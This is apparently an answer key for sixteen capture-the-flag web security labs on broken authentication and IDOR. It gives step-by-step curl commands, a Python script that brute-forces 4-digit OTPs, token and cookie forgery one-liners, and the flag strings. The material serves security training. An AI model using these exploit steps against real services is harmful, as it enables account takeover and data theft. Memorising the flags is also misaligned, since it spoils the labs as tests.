# Batch 03 Solutions — auth (+8) and idor (+8)

Base URL in these walkthroughs is `http://localhost:3000` (adjust the port to
whatever the lab runs on). All 16 labs were verified working with curl against
a live instance.

## auth – Broken Authentication

**1. Username Enumeration** – `PENTRIX{auth_user-enum}`

1. Open `GET /auth/enum-login`.
2. Submit a bogus name:
   `curl --data-urlencode "username=nosuchuser" --data-urlencode "password=x" http://localhost:3000/auth/enum-login`
   Response: "User nosuchuser not found."
3. Submit a real name with a wrong password (keep the same cookie jar so the
   session persists):
   `curl -c jar -b jar --data-urlencode "username=alice" --data-urlencode "password=wrongpw" http://localhost:3000/auth/enum-login`
   Response: "Wrong password for user alice." The different message confirms
   the username exists.
4. Submit the confirmed name:
   `curl -c jar -b jar --data-urlencode "username=alice" http://localhost:3000/auth/enum-submit`
   The flag is awarded.

Why it works: the login distinguishes "user not found" from "wrong password",
so each probe leaks whether a username exists; the submit page awards the flag
once a name confirmed through that oracle is submitted.

**2. Unsigned Remember-Me Cookie** – `PENTRIX{auth_rememberme}`

1. Log in as bob with "remember me" ticked:
   `curl -c jar --data-urlencode "username=bob" --data-urlencode "password=bob123" --data-urlencode "remember=1" http://localhost:3000/auth/remember-login`
   The response shows `remember_me=Ym9i`, which is base64("bob").
2. Forge the cookie for admin: base64("admin") = `YWRtaW4=`.
3. In a fresh session, present the forged cookie:
   `curl --cookie "remember_me=YWRtaW4=" http://localhost:3000/auth/remember`
   You are logged in as admin and the flag is awarded.

Why it works: the remember-me token is just base64(username) with no
signature or MAC, so anyone can mint a valid token for any user.

**3. Brute-Forcing a 4-Digit OTP** – `PENTRIX{auth_otp-bruteforce}`

1. `curl -c jar -b jar http://localhost:3000/auth/otp-reset` and copy the
   reset token from the page (the scenario hands you a valid token for admin).
2. Brute-force all 10,000 codes against the verify endpoint (no rate limiting).
   Example script:
   ```python
   import re, requests
   s = requests.Session()
   token = re.search(r'<pre class="token">([0-9a-f]+)</pre>',
                     s.get('http://localhost:3000/auth/otp-reset').text).group(1)
   for i in range(10000):
       r = s.post('http://localhost:3000/auth/otp-reset/verify',
                  data={'token': token, 'otp': '%04d' % i, 'newPassword': 'otpwned1'})
       if 'PENTRIX{auth_otp-bruteforce}' in r.text:
           print('found:', '%04d' % i); break
   ```
3. The correct code resets admin's password and awards the flag; log in at
   `/auth/login` with the new password to confirm.

Why it works: a 4-digit code with no rate limiting, no lockout, and no expiry
is enumerable in seconds, and the token alone was never meant to be secret.

**4. SHA-256 Predictable Reset Token** – `PENTRIX{auth_reset-predictable}`

1. Read the recipe shown on `GET /auth/sha-reset`:
   `sha256(username + 'reset-salt')`.
2. Forge admin's token locally, never requesting an admin reset:
   `node -e "console.log(require('crypto').createHash('sha256').update('admin'+'reset-salt').digest('hex'))"`
3. Confirm the forged token with a new password:
   `curl --data-urlencode "token=<forged>" --data-urlencode "newPassword=forged1" http://localhost:3000/auth/sha-reset/confirm`
   Admin's password changes and the flag is awarded.

Why it works: the token is a deterministic hash of public data, so anyone who
knows the recipe can mint a valid token for any account.

**5. Guessable Security Question** – `PENTRIX{auth_security-question}`

1. Open `GET /auth/bio/alice`. The bio says her mother's maiden name is Smith.
2. Reset her password with that answer:
   `curl --data-urlencode "username=alice" --data-urlencode "answer=Smith" --data-urlencode "newPassword=qwned1" http://localhost:3000/auth/question-reset`
   The flag is awarded; the new password works at `/auth/login`.

Why it works: the "secret" answer is public knowledge printed in the user's
bio, so the security question is not authentication at all.

**6. Password Change Without Current Password** – `PENTRIX{auth_change-pass-noverify}`

1. Log in as anyone: `curl -c jar -b jar --data-urlencode "username=bob" --data-urlencode "password=bob123" http://localhost:3000/auth/login`
2. Open `GET /auth/change-password` and note the form has no current-password field.
3. `curl -c jar -b jar --data-urlencode "newPassword=changed1" http://localhost:3000/auth/change-password`
   The password changes and the flag is awarded; log in with the new password
   to confirm.

Why it works: the endpoint trusts the session alone and never re-verifies
identity with the current password, so any active session can take over.

**7. Support Ticket Impersonation** – `PENTRIX{auth_support-impersonate}`

1. Open `GET /auth/support`. Tickets are sequential.
2. Walk the range: `curl "http://localhost:3000/auth/support/login?ticket=1001"`
   through `1005`. Ticket 1004 logs you in as bob; ticket 1005 logs you in as
   admin and awards the flag.

Why it works: ticket ids are predictable and the support endpoint performs no
authorization check, so anyone can impersonate any customer, including admin.

**8. API Key Leaked in HTML Comment** – `PENTRIX{auth_apikey-leak}`

1. Log in as anyone and open `GET /auth/settings` (keep the session cookie).
2. View the page source: an HTML comment contains the admin API key, e.g.
   `<!-- DEBUG leftover from development: admin api key = px_admin_9f8e7d6c5b4a3f21e0d7c6b5 (remove before prod) -->`.
3. Call the admin-only endpoint with it:
   `curl "http://localhost:3000/auth/api/admin/stats?api_key=px_admin_9f8e7d6c5b4a3f21e0d7c6b5"`
   The stats page renders and the flag is awarded (a wrong key gets 401).

Why it works: the only gate on the admin API is a static key, and a developer
left that key in an HTML comment readable via "view source".

## idor – Broken Access Control

Log in for these labs with the quick-login links, e.g.
`curl -c jar -b jar -L http://localhost:3000/idor/login/alice`.

**1. Invoice Download IDOR** – `PENTRIX{idor_idor-download}`

1. Log in as alice.
2. `curl -c jar -b jar http://localhost:3000/idor/invoice/2` (bob's invoice)
   or `/idor/invoice/3` (admin's). The other user's invoice renders and the
   flag is awarded. Your own (`/idor/invoice/1`) gives no flag.

Why it works: the invoice is fetched by id with no ownership check.

**2. Email Change IDOR** – `PENTRIX{idor_idor-email-change}`

1. Log in as alice and open `GET /idor/account` to see the change-email form.
2. Tamper the `user_id` field to target admin (id 1):
   `curl -c jar -b jar --data-urlencode "user_id=1" --data-urlencode "email=pwned@evil.lab" http://localhost:3000/idor/account/email`
   Admin's email is overwritten and the flag is awarded.

Why it works: the target account comes from a client-supplied `user_id`
parameter that the server never validates against the logged-in user.

**3. Shopping Cart IDOR** – `PENTRIX{idor_idor-cart}`

1. Log in as alice.
2. `curl -c jar -b jar "http://localhost:3000/idor/cart?user_id=3"` (bob's cart)
   or `?user_id=1` (admin's). The other user's cart renders and the flag is
   awarded.

Why it works: the cart is looked up by a client-supplied `user_id` query
parameter with no ownership check.

**4. API Key Regeneration IDOR** – `PENTRIX{idor_idor-apikey-regen}`

1. Log in as alice and open `GET /idor/apikey`.
2. Regenerate admin's key (id 1) instead of your own:
   `curl -c jar -b jar --data-urlencode "user_id=1" http://localhost:3000/idor/apikey/regen`
   The page shows the fresh key, e.g. `idor_d698ad906655d4006c633bae`.
3. Authenticate with it:
   `curl -c jar -b jar "http://localhost:3000/idor/apikey/use?key=idor_d698ad906655d4006c633bae"`
   The page confirms the key belongs to admin and the flag is awarded.

Why it works: key regeneration trusts a client-supplied `user_id` with no
ownership check, so you can rotate anyone's key and then use the new value.

**5. Stored Address IDOR** – `PENTRIX{idor_idor-address}`

1. Log in as alice.
2. `curl -c jar -b jar http://localhost:3000/idor/address/3` (admin's address)
   or `/idor/address/2` (bob's). The other user's address renders and the
   flag is awarded.

Why it works: the stored address is fetched by id with no ownership check.

**6. Forced Browsing to Admin Function** – `PENTRIX{idor_function-browse}`

1. Log in as alice (or bob), a non-admin user.
2. `curl -c jar -b jar http://localhost:3000/idor/admin/users`
   The full user list renders and the flag is awarded. The page is not linked
   anywhere for normal users, but nothing stops you from typing the URL.

Why it works: the endpoint only checks "logged in" and never the admin role,
so any authenticated user can force-browse the admin function.

**7. Comment Deletion IDOR** – `PENTRIX{idor_idor-comment-delete}`

1. Log in as bob and open `GET /idor/comments` to see comment ids.
2. Delete a comment written by someone else (admin's is id 1):
   `curl -c jar -b jar --data-urlencode "id=1" http://localhost:3000/idor/comments/delete`
   The comment is deleted and the flag is awarded.

Why it works: deletion is keyed by comment id only; authorship is never
checked.

**8. Private Notes IDOR** – `PENTRIX{idor_idor-notes}`

1. Log in as alice.
2. `curl -c jar -b jar http://localhost:3000/idor/notes/3` (admin's private
   note, containing the vault code) or `/idor/notes/2` (bob's). The other
   user's note renders and the flag is awarded.

Why it works: private notes are retrieved by numeric id with no ownership
check.
